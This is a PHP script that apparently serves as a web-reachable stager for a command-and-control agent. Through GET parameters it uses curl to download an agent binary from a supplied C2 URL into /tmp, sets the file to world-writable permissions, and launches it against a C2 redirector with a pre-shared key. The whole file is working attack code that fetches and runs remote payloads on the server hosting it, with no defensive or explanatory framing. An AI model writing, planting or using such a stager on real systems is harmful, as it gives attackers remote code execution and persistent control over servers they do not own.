<?php

if (isset($_GET['download']) && $_GET['download'] === 'true') {
    if (isset($_GET['c2_agent_url'], $_GET['agent_name'])) {
        $c2AgentUrl = $_GET['c2_agent_url'];
        $agentName = $_GET['agent_name'];
        
        $command = sprintf("curl -o /tmp/%s %s", escapeshellarg($agentName), escapeshellarg($c2AgentUrl));
        $handle = popen($command, 'w');

        if ($handle !== false) {
            pclose($handle);
            echo "Download initiated successfully.";
        } else {
            echo "Failed to initiate download.";
        }
    } else {
        echo "Missing required parameters for download.";
    }
} elseif (isset($_GET['change_perm']) && $_GET['change_perm'] === 'true') {
    if (isset($_GET['agent_name'])) {
        $agentName = $_GET['agent_name'];
        
        $command = sprintf("chmod 777 /tmp/%s", escapeshellarg($agentName));
        $handle = popen($command, 'w');

        if ($handle !== false) {
            pclose($handle);
            echo "Permission change executed successfully.";
        } else {
            echo "Failed to change permissions.";
        }
    } else {
        echo "Missing required parameter for permission change.";
    }
} elseif (isset($_GET['trigger_agent']) && $_GET['trigger_agent'] === 'true') {
    if (isset($_GET['c2_redirector_url'], $_GET['listenerport'], $_GET['psk'], $_GET['agent_name'])) {
        $c2RedirectorUrl = $_GET['c2_redirector_url'];
        $listenerPort = $_GET['listenerport'];
        $psk = $_GET['psk'];
        $agentName = $_GET['agent_name'];
        
        $command = sprintf("/tmp/%s -url %s/%s -psk %s", escapeshellarg($agentName), escapeshellarg($c2RedirectorUrl), escapeshellarg($listenerPort), escapeshellarg($psk));
        $handle = popen($command, 'w');

        if ($handle !== false) {
            pclose($handle);
            echo "Agent triggered successfully.";
        } else {
            echo "Failed to trigger agent.";
        }
    } else {
        echo "Missing required parameters for triggering agent.";
    }
} else {
    echo "No valid operation requested.";
}

?>
